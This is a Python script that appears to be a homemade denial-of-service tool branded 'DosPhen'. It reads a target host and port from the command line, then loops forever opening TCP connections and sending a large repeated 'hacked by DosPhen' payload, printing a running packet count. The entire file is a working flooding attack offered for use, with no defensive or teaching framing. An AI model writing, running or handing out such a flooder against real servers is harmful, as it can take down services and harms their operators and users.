import sys 
import socket
import colorama

######### #import ##########

colorama.init()
green = colorama.Fore.GREEN
red = colorama.Fore.RED
yellow = colorama.Fore.YELLOW
white = colorama.Fore.WHITE
payload = '''hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #hacked by DosPhen #
'''
payload = payload.replace("#","_")
payload = payload.replace(" ","_")
payload = payload*5
payload = bytes(payload.encode())
numberattack = 0
host , port , ip , window = 0 , 0 , 0 , 0
num = len(sys.argv)
data = sys.argv
x = 0
while x < num:
    if data[x] == "-ip" or data[x] == "-host" or data[x] == "--ip" or data[x] == "--host":
        host = data[x+1]
    if data[x] == "-p" or data[x] == "-port" or data[x] == "--p" or data[x] == "--port":
        port = data[x+1]
    if data[x] == "-w" or data[x] == "-window" or data[x] == "--w" or data[x] == "--window":
        window = data[x+1]
    x += 1
######### #variable #########
class get:
    torn =0
    def getip(host):
        try:
            ip = socket.gethostbyname(host)
        except:
            ip = host
        return(ip)

def printconsole(host,port):
    ip = get.getip(host)
    print(green+"""

 ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄ ▀▄     
█ ▄▀   █ █      █ █ █   ▐ █   █   █ █  █   ▄▀ ▐  ▄▀   ▐ █  █ █ █     
▐ █    █ █      █    ▀▄   ▐  █▀▀▀▀  ▐  █▄▄▄█    █▄▄▄▄▄  ▐  █  ▀█     
  █    █ ▀▄    ▄▀ ▀▄   █     █         █   █    █    ▌    █   █      
 ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀    ▄▀         ▄▀  ▄▀   ▄▀▄▄▄▄   ▄▀   █       
█     ▐            ▐      █          █   █     █    ▐   █    ▐       
▐                         ▐          ▐   ▐     ▐        ▐            
01100100 01101111 01110011 01010000 01101000 01100101 01101110  
01110000 01110010 01101111 01100111 01110010 01100001 01101101 01101101 01100101 01100100  01100010 01111001     
01101000 01100001 01100011 01101011 01100101 01110010  01110000 01101000 01100101 01101110 01101111 01101101 01100101 01101110 01100101  01100100 01111010 

    host : """+str(host)+"""
    ip : """+str(ip)+"""
    port : """+str(port)+"""
    """)
def conn(host,port,payload):
    try:
        ip = get.getip(host)
        i = 0
        
        while True:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,int(port)))
            s.send(payload)
            s.close()
            i += 1
            get.torn += 1
            print(red+' ['+str(green)+'+'+str(red)+'] send '+str(green)+str(i)+str(red)+' packet to '+str(green)+str(ip)+str(red)+"/"+str(green)+str(port),end="\r")
    except:
        print(red+"\n\n\n\tStoped ..!"+white)
        
def attack(host,port,payload):
  
  while True:  
    try:
            conn(host,port,payload)
            
            
            
            
    except:
        print(yellow+"\n["+str(red)+"!"+str(yellow)+"] "+str(green)+"server droped with "+str(get.torn)+" packet malignant\n")
######## #function ##########
printconsole(host,port)

conn(host,port,payload)
